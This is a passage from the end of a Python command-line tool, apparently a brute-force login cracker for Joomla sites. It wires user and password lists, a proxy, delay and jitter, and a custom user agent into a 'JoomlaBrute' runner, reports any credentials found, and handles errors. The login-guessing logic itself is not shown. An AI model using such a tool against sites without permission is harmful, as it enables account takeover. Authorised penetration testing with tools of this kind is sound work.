                padded_label = f"{label}{' ' * (max_label_len_cfg - len(label))}"
                # Print without side borders, align the colon
                print(
                    f" {Fore.CYAN}{padded_label}{Style.RESET_ALL} {Style.DIM}:{Style.RESET_ALL} {Fore.WHITE}{value}{Style.RESET_ALL}"
                )

            # Add a simple separator line instead of a bottom box border
            print(f"{Fore.BLUE}{'_' * (line_width + 2)}{Style.RESET_ALL}\n")

        # --- Initialize and Run ---
        bruteforce = JoomlaBrute(
            base_url=url,
            users=users,
            passwords=passwords,
            proxy=proxy,
            delay=args.delay,
            jitter=args.jitter,
            timeout=args.timeout,
            max_retries=args.retries,
            exit_on_success=args.exit_on_success,
            quiet=args.quiet,
            logger=logger,
            user_agent=args.user_agent or DEFAULT_USER_AGENT,
        )

        found_credentials = bruteforce.run()  # This will handle its own logging now
        sys.exit(0 if found_credentials else 1)  # Exit code 0 if success, 1 if not

    except FileNotFoundError as e:
        logger.error(f"Input file not found: {e}")
        sys.exit(1)
    except ValueError as e:
        logger.error(f"Input validation error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        # Attempt to display stats even if interrupted, unless quiet
        if "bruteforce" in locals() and not args.quiet:
            print(
                "\n"
                + Fore.YELLOW
                + "[!] Operation interrupted by user. Displaying partial stats..."
                + Style.RESET_ALL
            )
            bruteforce.display_stats()
        else:
            logger.info("\n[!] Operation cancelled by user.")
        sys.exit(130)  # Standard exit code for Ctrl+C
    except Exception as e:
        logger.error(f"[!] An unexpected fatal error occurred: {e}")
        if args.verbose:
            import traceback

            logger.debug(traceback.format_exc())
        sys.exit(2)


if __name__ == "__main__":
    main()
